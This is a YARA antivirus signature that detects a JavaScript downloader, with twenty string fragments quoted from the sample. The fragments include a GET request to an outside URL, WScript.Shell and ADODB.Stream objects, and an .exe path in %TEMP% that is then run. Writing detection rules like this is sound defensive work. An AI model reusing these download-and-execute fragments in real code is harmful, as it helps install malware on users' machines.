rule sig_20160401_ffad6560ce1aca3f702fdde1bc3ecfd7 {
  meta:
    description = "datamaliciousorder - file 20160401_ffad6560ce1aca3f702fdde1bc3ecfd7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "55db78681454443fecdeb2b12c69f1d8d810a0d25258a8b185d218929293401c"

  strings:
    $s1  = "QooAb[YmYk](\"G\" + \"ET\", \"http://abnregistrationaustralia.com.au/k38sa\", false);" fullword ascii
    $s2  = "function OqgKhq(ZbYer, QfaHyp){FoFs = FoFs * 1; return ZbYer - QfaHyp;};" fullword ascii
    $s3  = "var GfhWv = function MxCy() {return WScript[RoVfi](\"WScript\"+\".Shell\");}(), QptZwc = 11;" fullword ascii
    $s4  = "if (QooAb[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "ZyyJzj = WScript[NiCk()](\"A\"+\"DODB.Stream\");" fullword ascii
    $s6  = "function PdeFxv(){return PkzWo + \"\";};" fullword ascii
    $s7  = "function XrdXl() {return GfhWv[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"8AwbrEeE.ex\" + \"e\";};" fullword ascii
    $s8  = "function JruHd() {return ((AesHp == true) && (AesHp == BcyNzy)) ? 1 : FoFs;};" fullword ascii
    $s9  = "function KvOmk(AzKaq){GfhWv[\"R\"+\"un\"](AzKaq, FoFs, FoFs);};" fullword ascii
    $s10 = "function NiCk(){return RoVfi;};" fullword ascii
    $s11 = "var FktZem = false;" fullword ascii
    $s12 = "function HwMxf()" fullword ascii
    $s13 = "var BcyNzy = false;" fullword ascii
    $s14 = "var XzrRj = new this[\"Date\"]();" fullword ascii
    $s15 = "BcyNzy = true; " fullword ascii
    $s16 = "AesHp = true; " fullword ascii
    $s17 = "function PfnWh(LmqAaw) {var IdCi = (1, 2, 3, 4, 5, LmqAaw); return IdCi;};" fullword ascii
    $s18 = "return OqgKhq(TrRf, LlcSh);" fullword ascii
    $s19 = "function EnqHd(){return 23;};" fullword ascii
    $s20 = "}while (OxVtx);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}